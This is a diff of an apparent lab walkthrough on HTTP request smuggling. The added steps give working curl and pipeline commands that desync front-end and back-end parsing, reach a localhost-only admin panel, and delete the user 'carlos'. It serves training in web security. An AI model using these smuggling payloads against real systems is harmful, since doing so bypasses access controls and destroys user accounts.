@@ -230,6 +230,7 @@ x=1
 ```
 
 To construct this request:
+
 **1.** construct the `/admin`request:
 ```shell
 httpecho -d admin
@@ -238,21 +239,48 @@ curl http://localhost:8888/admin -H "Host:" -H 'User-Agent:'  -H 'Accept:' -X PO
 
 **2.** Smuggle it within legit request:
 ```shell
-httpecho -d bypass
+httpecho -d smuggle_admin
 curl http://localhost:8888 -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' --data-binary "@admin"
 ```
 
 **3.** Check request treatment by back-end:
 ```shell
-cat bypass | httpcustomhouse -te | httpcustomhouse -cl -r
+cat smuggle_admin | httpcustomhouse -te | httpcustomhouse -cl -r
 ```
 
 **4.** Send it
 ```shell
-cat bypass | httpclient https://$LAB_URL
-cat bypass | httpclient https://$LAB_URL # twice to get result for the smuggled request
+cat smuggle_admin | httpclient https://$LAB_URL
+cat smuggle_admin | httpclient https://$LAB_URL # twice to get result for the smuggled request
 [...]
 Admin interface only available to local users
 ```
 
-You can only access admin panel from localhost -> add `Host: localhost` for the smuggling request
+You can only access admin panel from localhost -> add `Host: localhost` for the smuggling request:
+```shell
+cat admin | httpoverride --host "localhost" > admin_localhost
+httpecho -d smuggle_admin_localhost
+curl http://localhost:8888 -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' --data-binary "@admin_localhost"
+cat smuggle_admin_localhost | httpclient https://$LAB_URL
+cat smuggle_admin_localhost | httpclient https://$LAB_URL #twice
+[...]
+                        <h1>Users</h1>
+                        <div>
+                            <span>carlos - </span>
+                            <a href="/admin/delete?username=carlos">Delete</a>  # <---- what we want
+                        </div>
+
+```
+
+**~> Delete account**
+
+Change the smuggle request to a `GET`on `/admin/delete?username=carlos`:
+```shell
+httpecho -d delete
+curl http://localhost:8888/admin/delete?username=carlos -H "Host: localhost" -H 'User-Agent:'  -H 'Accept:' -X POST --data 'x=1' -H 'Content-Length: 15'
+httpecho -d smuggle_delete
+curl http://localhost:8888 -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' --data-binary "@delete"
+cat smuggle_delete | httpclient https://$LAB_URL #twice
+```
+
+
